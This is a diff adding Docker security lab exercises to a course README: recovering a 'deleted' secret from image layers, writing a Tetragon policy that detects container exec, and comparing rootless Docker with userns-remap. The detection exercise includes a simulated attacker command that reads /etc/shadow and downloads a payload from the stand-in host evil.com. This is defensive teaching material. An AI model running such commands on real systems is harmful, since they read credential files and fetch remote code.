@@ -38,16 +38,19 @@ for Efrei MSc students
     * [Build and scan a deliberately vulnerable image](#build-and-scan-a-deliberately-vulnerable-image)
     * [Apply security rules to a real application](#apply-security-rules-to-a-real-application)
     * [Inspect image layers with Dive](#inspect-image-layers-with-dive)
+    * [Exercise: Prove that "deleting isn't removing" in OverlayFS](#exercise-prove-that-deleting-isnt-removing-in-overlayfs)
 * [Part 5: Security Tools](#part-5-security-tools)
     * [eBPF (Extended Berkeley Packet Filter)](#ebpf-extended-berkeley-packet-filter)
     * [Tetragon](#tetragon)
     * [Explore Tetragon](#explore-tetragon)
     * [Create custom tracing policies](#create-custom-tracing-policies)
     * [Detect shell spawned in containers](#detect-shell-spawned-in-containers)
+    * [Full-circle: Detect the Part 2 attacks with Tetragon](#full-circle-detect-the-part-2-attacks-with-tetragon)
     * [Exercise: Monitor a real application with Tetragon](#exercise-monitor-a-real-application-with-tetragon)
     * [Docker Bench for Security](#docker-bench-for-security)
 * [Part 6: Sandboxing](#part-6-sandboxing)
     * [Rootless Docker](#rootless-docker)
+    * [Understanding: Rootless mode vs userns-remap](#understanding-rootless-mode-vs-userns-remap)
 
 ---
 
@@ -1089,6 +1092,68 @@ Look for:
 - Unnecessarily large layers
 - Files that should have been excluded via `.dockerignore`
 
+### Exercise: Prove that "deleting isn't removing" in OverlayFS
+
+This exercise demonstrates that deleting a file in a later Dockerfile layer does **not** remove it from the image -- it only hides it behind a whiteout marker. The secret persists in the earlier layer.
+
+**1. Build an image that adds then "deletes" a secret:**
+
+```bash
+cat > secret-leak.Dockerfile << 'EOF'
+FROM alpine:3.20
+
+# Layer 1: create a secret file
+RUN echo "DB_PASSWORD=SuperSecret123!" > /tmp/credentials.txt
+
+# Layer 2: "delete" the secret (students expect this to remove it)
+RUN rm /tmp/credentials.txt
+
+CMD ["echo", "No secrets here... or are there?"]
+EOF
+
+docker build -t secret-leak -f secret-leak.Dockerfile .
+```
+
+**2. Verify the file is gone at runtime:**
+
+```bash
+docker run --rm secret-leak cat /tmp/credentials.txt
+# cat: can't open '/tmp/credentials.txt': No such file or directory
+```
+
+The file appears deleted. But is it really gone?
+
+**3. Use `docker history` to inspect the layers:**
+
+```bash
+docker history secret-leak
+```
+
+Notice that the `RUN echo "DB_PASSWORD=..."` layer is still listed with a non-zero size -- the data is still there.
+
+**4. Use Dive to find the secret in the earlier layer:**
+
+```bash
+dive secret-leak
+```
+
+Navigate to the layer created by `RUN echo "DB_PASSWORD=..."`. You'll see `/tmp/credentials.txt` still exists in that layer. The `RUN rm` layer only added a whiteout marker.
+
+**5. Extract the secret directly from the image layers:**
+
+```bash
+# Save the image as a tar archive
+docker save secret-leak -o secret-leak.tar
+mkdir secret-leak-layers && tar xf secret-leak.tar -C secret-leak-layers
+
+# Search every layer for the secret
+grep -r "SuperSecret123" secret-leak-layers/
+```
+
+The secret is found in one of the layer tarballs -- proving that `rm` in a later layer does not erase data from earlier layers.
+
+**Takeaway:** Never put secrets in any Dockerfile layer, even temporarily. Use multi-stage builds, build-time secrets (`--mount=type=secret`), or external secret stores instead.
+
 ---
 
 ## Part 5: Security Tools
@@ -1390,6 +1455,79 @@ Tetragon will show the shell execution event from inside the container's PID nam
 sudo docker stop tetragon
 ```
 
+### Full-circle: Detect the Part 2 attacks with Tetragon
+
+In Part 2 you performed attacks (privilege escalation, docker exec into containers, docker socket abuse). Now create a Tetragon policy that would have detected them -- closing the loop between attack and defense.
+
+**1. Create a policy that detects `docker exec` into any container:**
+
+When an attacker runs `docker exec -it <container> sh`, the runc binary spawns a new process inside the container's PID namespace. This policy catches exactly that pattern:
+
+```bash
+cat > detect-exec-policy.yaml << 'EOF'
+apiVersion: cilium.io/v1alpha1
+kind: TracingPolicy
+metadata:
+  name: detect-container-exec
+spec:
+  kprobes:
+  - call: "security_bprm_check"
+    syscall: false
+    args:
+    - index: 0
+      type: "linux_binprm"
+    selectors:
+    # Match any binary execution inside a container (non-host PID namespace)
+    - matchNamespaces:
+      - namespace: Pid
+        operator: NotIn
+        values:
+        - "host_ns"
+      matchActions:
+      - action: Post
+EOF
+```
+
+**Understanding:** Unlike the shell-detection policy (which only matches `/sh`, `/bash`, etc.), this policy catches **any** binary execution inside a container -- including an attacker running `curl`, `wget`, `python`, or compiled exploits.
+
+**2. Run Tetragon with the policy:**
+
+```bash
+sudo docker run -d --name tetragon --rm \
+  --pid=host --cgroupns=host \
+  --privileged \
+  -v /sys/kernel/btf/vmlinux:/var/run/tetragon/btf \
+  -v /sys/fs/cgroup:/sys/fs/cgroup \
+  -v /sys/kernel/tracing:/sys/kernel/tracing \
+  -v /sys/kernel/debug:/sys/kernel/debug \
+  -v $(pwd)/detect-exec-policy.yaml:/etc/tetragon/tetragon.tp.d/detect-exec-policy.yaml \
+  quay.io/cilium/tetragon:v1.3.0
+```
+
+**3. Watch events and replay the Part 2 attack:**
+
+```bash
+# Terminal 1: watch Tetragon
+sudo docker exec tetragon tetra getevents -o compact
+
+# Terminal 2: start a target container
+docker run -d --name victim alpine sleep 300
+
+# Terminal 3: simulate the attacker from Part 2
+docker exec -it victim sh -c "cat /etc/shadow; wget http://evil.com/payload"
+```
+
+Tetragon will report every binary execution (`sh`, `cat`, `wget`) inside the `victim` container -- the same attack you performed in Part 2, now detected.
+
+**4. Discuss:** How would you modify this policy to **block** the attack instead of just logging it? (Hint: change `action: Post` to `action: Sigkill`.)
+
+**5. Cleanup:**
+
+```bash
+sudo docker stop tetragon
+docker stop victim
+```
+
 ### Exercise: Monitor a real application with Tetragon
 
 Check and run the Budibase docker-compose:
@@ -1546,3 +1684,55 @@ ps -ef | grep sleep
 ```
 
 **Observe the difference:** The rootless container's process runs as your normal user, while the default container's process runs as root. This is the key security benefit — even if an attacker escapes the container, they land as an unprivileged user on the host.
+
+### Understanding: Rootless mode vs userns-remap
+
+Students often confuse these two. They both use user namespaces, but at different levels.
+
+**Run both side-by-side and compare `ps -ef` output on the host:**
+
+```bash
+# Terminal 1: Rootless mode (daemon + container both unprivileged)
+docker context use rootless
+docker run -d --rm --name rootless-test alpine sleep 300
+
+# Terminal 2: Default Docker with userns-remap (daemon runs as ROOT, container remapped)
+docker context use default
+# Enable userns-remap by adding to /etc/docker/daemon.json:
+# { "userns-remap": "default" }
+# Then: sudo systemctl restart docker
+sudo docker run -d --rm --name remap-test alpine sleep 300
+
+# Terminal 3: Default Docker without remap (daemon + container both root)
+sudo docker run -d --rm --name root-test alpine sleep 300
+```
+
+**Now compare all three from the host:**
+
+```bash
+echo "=== Rootless mode ==="
+ps -eo pid,user,args | grep "sleep 300" | grep -v grep
+
+echo "=== userns-remap mode ==="
+ps -eo pid,user,args | grep "sleep 300" | grep -v grep
+
+echo "=== Default root mode ==="
+ps -eo pid,user,args | grep "sleep 300" | grep -v grep
+```
+
+**Expected results:**
+
+| Mode | Docker daemon runs as | Container process on host | Container escape lands as |
+|---|---|---|---|
+| **Default (root)** | `root` | `root` | `root` -- full host compromise |
+| **userns-remap** | `root` | `165536` (remapped UID) | Unprivileged user, but daemon is still root |
+| **Rootless** | Your user (e.g., `ubuntu`) | Your user (e.g., `ubuntu`) | Unprivileged user, daemon also unprivileged |
+
+> **Key takeaway:** userns-remap only remaps the container's UID -- the Docker daemon itself still runs as root, meaning a daemon exploit still gives root. True rootless mode runs **everything** (daemon + containers) unprivileged.
+
+**Cleanup:**
+
+```bash
+docker stop rootless-test 2>/dev/null
+sudo docker stop remap-test root-test 2>/dev/null
+```
